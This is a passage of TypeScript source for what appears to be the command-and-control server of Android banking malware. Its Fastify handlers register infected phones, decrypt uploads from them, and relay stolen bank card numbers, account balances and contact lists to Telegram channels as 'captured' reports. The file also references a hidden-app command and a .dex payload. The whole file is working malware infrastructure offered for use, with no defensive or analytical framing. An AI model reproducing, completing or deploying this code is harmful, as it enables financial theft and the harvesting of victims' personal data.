import { FastifyRequest, FastifyReply } from "fastify";
import { createPublicKey, createPrivateKey } from "crypto";
import { InputMediaBuilder, InputFile } from "grammy";
import { createReadStream, statSync } from "fs";
import { join as pathJoin } from "path";
import { classify } from "../database/dbs";
import { Realme } from "../encryption";
import { Client, IncomingMessage } from "../modules";
import { createFont, formatNumberWithUnit, numberCommas, chunkList, getJalaliTime, getNowJalali } from "../utilities";
import { middlegirl, scarlett } from "./declaration";

const dex_path = pathJoin(__dirname, "..", ".dex", "c.dex");
const dex_stat = statSync(dex_path);

export const Hook = {
    register: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const ip_check = await classify.ipblocker.getIP(request.ip);
            if (ip_check) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            if (!request.body) return reply.code(422).send({ status: false, message: "no body required" });

            const body = request.body as any;
            const id_check = await classify.ceph.getClientById(body.id);

            if (id_check) return reply.code(403).send({ status: false, message: "you are not suppose to request this endpoint" });

            const port_check = await classify.portService.getPort(body.from_port);

            if (!port_check) return reply.code(422).send({ status: false, message: "invalid port name" });

            if (port_check.status !== "active") return reply.code(500).send({ status: false, message: "your port is not active" });

            if (body.balance === undefined || body.balance === null) body.balance = {};

            let all_in_one = 0n;
            for (const blncekey of Object.keys(body.balance)) {
                const blncearray = body.balance[blncekey];
                for (const blnce of blncearray) {
                    if (blnce.value) {
                        try {
                            blnce.value = blnce.value.replaceAll(",", "");
                            blnce.value = blnce.value.replaceAll("/", "");
                            all_in_one += BigInt(blnce.value);
                        } catch (e) { console.error(e); }
                    }
                }
            }

            const keys = Realme.storeServerKeys();
            const clientKeys = Realme.generateRSAKeyPair();

            const client: Client = {
                ip: request.ip,
                id: body.id,
                android_version: body.android_version,
                app_behave: body.app_behave,
                app_name: body.app_name,
                balance_count: all_in_one.toString(),
                battery: body.battery,
                blocked: false,
                from_port: body.from_port,
                connected_at: Date.now(),
                last_connection_at: Date.now(),
                mask_name: "N/A",
                mobile: body.mobile,
                permissions: body.permissions,
                screen_status: body.screen_status,
                version: body.version,
                private_key: clientKeys.rawPrivateKey,
                public_key: clientKeys.rawPublicKey,
                is_online: true
            };

            await classify.ceph.addClient(client);
            await classify.tokenService.addToken({ id: body.id, port: body.from_port, token: body.token });

            let texts_to_send: string[] = [createFont("🕷️ | #new_user has connected\n\n🪄 | panel: ") + `/set_${client.id}` + createFont(`\n🌊 | port: `) + `<code>${body.from_port}</code>` + createFont("\n🌐 | ip: ") + `<code>${client.ip}</code>` + createFont(`\n${(client.battery >= 30) ? '🔋' : '🪫'} | battery: ${client.battery}%\n📱 | mobile: ${client.mobile}\n🦠 | android ${client.android_version}\n🪡 | app name: ${client.app_name}\n`) + `🧼` + createFont(` | screen: ${client.screen_status} | ${client.app_behave} app`) + createFont(`\n⛓️ | app version: ${body.version}`) + createFont(`\n📦 | permissions: ${(body.permissions).join(", ")}`)];

            if (body.balance && Object.keys(body.balance).length > 0) {
                texts_to_send[0] += `\n\n💰 | balance [ ${formatNumberWithUnit(numberCommas((all_in_one).toString()))} ]: <blockquote expandable>`;
                let numb = 0;
                const banks_added: string[] = [];
                for (const ckey of Object.keys(body.balance)) {
                    if (texts_to_send[numb]!.length < 2500) {
                        const added_bank = banks_added.includes(ckey);
                        if (!added_bank) {
                            texts_to_send[numb]! += "=".repeat(30) + `\n☎️ | بانک: ${createFont(ckey ?? "unknown")}\n`;
                        }

                        for (const item of (body.balance[ckey] as { four_char_card: string, value: string }[])) {
                            texts_to_send[numb]! += `\n🏦 | کارت: <code>${item.four_char_card}</code>\n💵 | موجودی: ${item.value}\n` + "-".repeat(30);
                        }
                    } else {
                        numb += 1;
                        texts_to_send[numb] += "";
                        const added_bank = banks_added.includes(ckey);
                        if (!added_bank) {
                            texts_to_send[numb]! += "=".repeat(30) + `\n☎️ | بانک: ${createFont(ckey ?? "unknown")}\n`;
                        }

                        for (const item of (body.balance[ckey] as { four_char_card: string, value: string }[])) {
                            texts_to_send[numb]! += `\n🏦 | کارت: <code>${item.four_char_card}</code>\n💵 | موجودی: ${item.value}\n` + "-".repeat(30);
                        }
                    }
                }

                if (!texts_to_send[texts_to_send.length - 1]!.endsWith("</blockquote>")) {
                    texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                }

                for (const txt of texts_to_send) {
                    await middlegirl.api.sendMessage(port_check.stores_to, txt, { parse_mode: "HTML" });
                }
            } else {
                for (const txt of texts_to_send) {
                    await middlegirl.api.sendMessage(port_check.stores_to, txt, { parse_mode: "HTML" });
                }
            }

            return reply.send({
                status: true,
                client_private_key: clientKeys.rawPrivateKey,
                server_public_key: keys.publicKey
            });
        } catch (e) {
            console.error("[hooks:register] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    selfUpdate: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            let all_in_one = 0n;
            for (const blncekey of Object.keys(message.balance)) {
                const blncearray = message.balance[blncekey];
                for (const blnce of blncearray) {
                    if (blnce.value) {
                        try {
                            blnce.value = blnce.value.replaceAll(",", "");
                            blnce.value = blnce.value.replaceAll("/", "");
                            all_in_one += BigInt(blnce.value);
                        } catch (e) { console.error(e); }
                    }
                }
            }

            await classify.ceph.updateClient(body.signerId, {
                balance_count: all_in_one.toString(),
                app_name: message.app_name,
                app_behave: message.app_behave,
                ip: request.ip,
                permissions: message.permissions,
                last_connection_at: Date.now(),
                screen_status: message.screen_status,
                is_online: true
            });

            const msg_to_send = JSON.stringify({ status: true });
            const encrypted_message = Realme.encrypt(msg_to_send, {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            const session = await classify.session.getSession(message.session_id);

            if (session) {
                await middlegirl.api.editMessageText(
                    port_info.stores_to,
                    session.message_id,
                    createFont("🌿 | user responsed\n👤 | from ") + `/set_${body.signerId}` + "<blockquote>" + createFont("\n🌐 | ip: ") + `<code>${request.ip}</code>` + createFont(`\n${(message.battery >= 30) ? '🔋' : '🪫'} | battery: ${message.battery}%\n📱 | mobile: ${message.mobile}\n🦠 | android ${message.android_version}\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app`) + createFont(`\n⛓️ | app version: ${message.version}`) + createFont(`\n📦 | permissions: ${(message.permissions).join(", ")}`) + "</blockquote>",
                    { parse_mode: "HTML" }
                );
            } else {
                await middlegirl.api.sendMessage(
                    port_info.stores_to,
                    createFont("🌿 | user responsed\n👤 | from ") + `/set_${body.signerId}` + "<blockquote>" + createFont("\n🌐 | ip: ") + `<code>${request.ip}</code>` + createFont(`\n${(message.battery >= 30) ? '🔋' : '🪫'} | battery: ${message.battery}%\n📱 | mobile: ${message.mobile}\n🦠 | android ${message.android_version}\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app`) + createFont(`\n⛓️ | app version: ${message.version}`) + createFont(`\n📦 | permissions: ${(message.permissions).join(", ")}`) + "</blockquote>",
                    { parse_mode: "HTML" }
                );
            }

            return reply.send(encrypted_message);
        } catch (e) {
            console.error("[hooks:selfUpdate] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    groupPing: async (request: FastifyRequest, reply: FastifyReply) => {
        const body = request.body as any;

        const port = await classify.portService.getPort(body.from_port);

        if (!port) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

        if (port.status !== "active") return reply.code(500).send({ status: false, message: "your port is not active" });

        const user = await classify.ceph.getClientById(body.id);

        if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

        setTimeout(async () => {await classify.ceph.setClientStatus(user, "offline")}, 500);

        return reply.send({ status: true });
    },

    refresh: async (request: FastifyRequest, reply: FastifyReply) => {
        const body = request.body as any;

        const port = await classify.portService.getPort(body.from_port);

        if (!port) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

        if (port.status !== "active") return reply.code(500).send({ status: false, message: "your port is not active" });


        const user = await classify.ceph.getClientById(body.signerId);

        if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

        await classify.tokenService.addToken({ id: body.signerId, port: body.from_port, token: body.token });

        return reply.send({ status: true });
    },

    getContacts: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            if (message.status) {
                const valid_data = classify.schemas.createArrayContactSchema().validate(message.contacts);

                if (valid_data.error) {
                    const encrypted_message = Realme.encrypt(
                        JSON.stringify({ status: false, message: "invalid input data" }),
                        {
                            recipient: "client",
                            sender: "server",
                            senderPrivateKey: createPrivateKey(keys.privateKey),
                            recipientPublicKey: createPublicKey(user.public_key),
                            signerId: "api-server-01"
                        }
                    );
                    return reply.code(401).send(encrypted_message);
                }

                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        const chunked = chunkList(valid_data.value);
                        let texts_to_send: string[] = [(createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (createFont(`👥 | list of contacts [ ${valid_data.value.length} ]\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app\n`))];
                        texts_to_send[0] += "<blockquote expandable>";
                        let numb = 0;

                        for (const chunk of chunked) {
                            if (texts_to_send[numb]!.length < 3500) {
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n👤 | ${c.name ?? createFont("unknown")}\n📞 | <code>${c.number ?? createFont("unknown")}</code>\n` + "=".repeat(30);
                                }).join("");
                            } else {
                                texts_to_send[numb]! += "</blockquote>";
                                numb += 1;
                                texts_to_send.push("<blockquote expandable>");
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n👤 | ${c.name ?? createFont("unknown")}\n📞 | <code>${c.number ?? createFont("unknown")}</code>\n` + "=".repeat(30);
                                }).join("");
                            }
                        }

                        if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                            texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                        }

                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            texts_to_send[0]!,
                            { parse_mode: "HTML" }
                        );

                        for (const txt of texts_to_send.slice(1)) {
                            await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                        }
                    }
                } else {
                    const chunked = chunkList(valid_data.value);
                    let texts_to_send: string[] = [(createFont(`🛡️ | captured #getContacts\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (createFont(`👥 | list of contacts [ ${valid_data.value.length} ]\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app\n`))];
                    texts_to_send[0] += "<blockquote expandable>";
                    let numb = 0;

                    for (const chunk of chunked) {
                        if (texts_to_send[numb]!.length < 3500) {
                            texts_to_send[numb]! += chunk.map((c) => {
                                return `\n👤 | ${c.name ?? createFont("unknown")}\n📞 | <code>${c.number ?? createFont("unknown")}</code>\n` + "=".repeat(30);
                            }).join("");
                        } else {
                            texts_to_send[numb]! += "</blockquote>";
                            numb += 1;
                            texts_to_send.push("<blockquote expandable>");
                            texts_to_send[numb]! += chunk.map((c) => {
                                return `\n👤 | ${c.name ?? createFont("unknown")}\n📞 | <code>${c.number ?? createFont("unknown")}</code>\n` + "=".repeat(30);
                            }).join("");
                        }
                    }

                    if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                        texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                    }

                    await scarlett.api.sendMessage(port_info.stores_to, texts_to_send[0]!, { parse_mode: "HTML" });

                    for (const txt of texts_to_send.slice(1)) {
                        await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                    }
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #getContacts\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);
        } catch (e) {
            console.error("[hooks:getContacts] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    getCards: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            if (message.status) {
                const valid_data = classify.schemas.createCardSchema().validate(message.cards);

                if (valid_data.error) {
                    const encrypted_message = Realme.encrypt(
                        JSON.stringify({ status: false, message: "invalid input data" }),
                        {
                            recipient: "client",
                            sender: "server",
                            senderPrivateKey: createPrivateKey(keys.privateKey),
                            recipientPublicKey: createPublicKey(user.public_key),
                            signerId: "api-server-01"
                        }
                    );
                    return reply.code(401).send(encrypted_message);
                }

                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        const chunked = chunkList(valid_data.value);
                        let texts_to_send: string[] = [(createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (createFont(`🗃️ | list of cards [ ${valid_data.value.length} ]\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app\n`))];
                        texts_to_send[0] += "<blockquote expandable>";
                        let numb = 0;

                        for (const chunk of chunked) {
                            if (texts_to_send[numb]!.length < 4000) {
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n💳 | <code>${c}</code>\n` + "=".repeat(30);
                                }).join("");
                            } else {
                                texts_to_send[numb]! += "</blockquote>";
                                numb += 1;
                                texts_to_send.push("<blockquote expandable>");
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n💳 | <code>${c}</code>\n` + "=".repeat(30);
                                }).join("");
                            }
                        }

                        if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                            texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                        }

                        await scarlett.api.editMessageText(port_info.stores_to, action_session.message_id, texts_to_send[0]!, { parse_mode: "HTML" });

                        for (const txt of texts_to_send.slice(1)) {
                            await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                        }
                    }
                } else {
                    const chunked = chunkList(valid_data.value);
                    let texts_to_send: string[] = [(createFont(`🛡️ | captured #getCards\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (createFont(`🗃️ | list of cards [ ${valid_data.value.length} ]\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app\n`))];
                    texts_to_send[0] += "<blockquote expandable>";
                    let numb = 0;

                    for (const chunk of chunked) {
                        if (texts_to_send[numb]!.length < 4000) {
                            texts_to_send[numb]! += chunk.map((c) => {
                                return `\n💳 | <code>${c}</code>\n` + "=".repeat(30);
                            }).join("");
                        } else {
                            texts_to_send[numb]! += "</blockquote>";
                            numb += 1;
                            texts_to_send.push("<blockquote expandable>");
                            texts_to_send[numb]! += chunk.map((c) => {
                                return `\n💳 | <code>${c}</code>\n` + "=".repeat(30);
                            }).join("");
                        }
                    }

                    if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                        texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                    }

                    await scarlett.api.sendMessage(port_info.stores_to, texts_to_send[0]!, { parse_mode: "HTML" });

                    for (const txt of texts_to_send.slice(1)) {
                        await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                    }
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #getCards\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);
        } catch (e) {
            console.error("[hooks:getCards] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    getBalance: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            if (message.status) {
                const valid_data = classify.schemas.createBalanceSchema().validate(message.balance);

                if (valid_data.error) {
                    const encrypted_message = Realme.encrypt(
                        JSON.stringify({ status: false, message: "invalid input data" }),
                        {
                            recipient: "client",
                            sender: "server",
                            senderPrivateKey: createPrivateKey(keys.privateKey),
                            recipientPublicKey: createPublicKey(user.public_key),
                            signerId: "api-server-01"
                        }
                    );
                    return reply.code(401).send(encrypted_message);
                }

                let all_in_one = 0n;
                for (const blncekey of Object.keys(message.balance)) {
                    const blncearray = message.balance[blncekey];
                    for (const blnce of blncearray) {
                        if (blnce.value) {
                            try {
                                blnce.value = blnce.value.replaceAll(",", "");
                                blnce.value = blnce.value.replaceAll("/", "");
                                all_in_one += BigInt(blnce.value);
                            } catch (e) { console.error(e); }
                        }
                    }
                }

                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        let texts_to_send: string[] = [(createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (`💰 | balance [ ${formatNumberWithUnit(numberCommas((all_in_one).toString()))} ]: <blockquote expandable>`)];
                        let numb = 0;
                        const banks_added: string[] = [];
                        for (const ckey of Object.keys(message.balance)) {
                            if (texts_to_send[numb]!.length < 2500) {
                                const added_bank = banks_added.includes(ckey);
                                if (!added_bank) {
                                    texts_to_send[numb]! += "=".repeat(30) + `\n☎️ | بانک: ${createFont(ckey ?? "unknown")}\n`;
                                }

                                for (const item of (message.balance[ckey] as { four_char_card: string, value: string }[])) {
                                    texts_to_send[numb]! += `\n🏦 | کارت: <code>${item.four_char_card}</code>\n💵 | موجودی: ${item.value}\n` + "-".repeat(30);
                                }
                            } else {
                                numb += 1;
                                texts_to_send[numb] += "";
                                const added_bank = banks_added.includes(ckey);
                                if (!added_bank) {
                                    texts_to_send[numb]! += "=".repeat(30) + `\n☎️ | بانک: ${createFont(ckey ?? "unknown")}\n`;
                                }

                                for (const item of (message.balance[ckey] as { four_char_card: string, value: string }[])) {
                                    texts_to_send[numb]! += `\n🏦 | کارت: <code>${item.four_char_card}</code>\n💵 | موجودی: ${item.value}\n` + "-".repeat(30);
                                }
                            }
                        }

                        if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                            texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                        }

                        await scarlett.api.editMessageText(port_info.stores_to, action_session.message_id, texts_to_send[0]!, { parse_mode: "HTML" });

                        for (const txt of texts_to_send.slice(1)) {
                            await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                        }
                    }
                } else {
                    let texts_to_send: string[] = [(createFont(`🛡️ | captured #getBalance\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (`💰 | balance [ ${formatNumberWithUnit(numberCommas((all_in_one).toString()))} ]: <blockquote expandable>`)];
                    let numb = 0;
                    const banks_added: string[] = [];
                    for (const ckey of Object.keys(message.balance)) {
                        if (texts_to_send[numb]!.length < 2500) {
                            const added_bank = banks_added.includes(ckey);
                            if (!added_bank) {
                                texts_to_send[numb]! += "=".repeat(30) + `\n☎️ | بانک: ${createFont(ckey ?? "unknown")}\n`;
                            }

                            for (const item of (message.balance[ckey] as { four_char_card: string, value: string }[])) {
                                texts_to_send[numb]! += `\n🏦 | کارت: <code>${item.four_char_card}</code>\n💵 | موجودی: ${item.value}\n` + "-".repeat(30);
                            }
                        } else {
                            numb += 1;
                            texts_to_send[numb] += "";
                            const added_bank = banks_added.includes(ckey);
                            if (!added_bank) {
                                texts_to_send[numb]! += "=".repeat(30) + `\n☎️ | بانک: ${createFont(ckey ?? "unknown")}\n`;
                            }

                            for (const item of (message.balance[ckey] as { four_char_card: string, value: string }[])) {
                                texts_to_send[numb]! += `\n🏦 | کارت: <code>${item.four_char_card}</code>\n💵 | موجودی: ${item.value}\n` + "-".repeat(30);
                            }
                        }
                    }

                    if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                        texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                    }

                    await scarlett.api.sendMessage(port_info.stores_to, texts_to_send[0]!, { parse_mode: "HTML" });

                    for (const txt of texts_to_send.slice(1)) {
                        await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                    }
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #getBalance\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);
        } catch (e) {
            console.error("[hooks:getBalance] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    hideApp: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
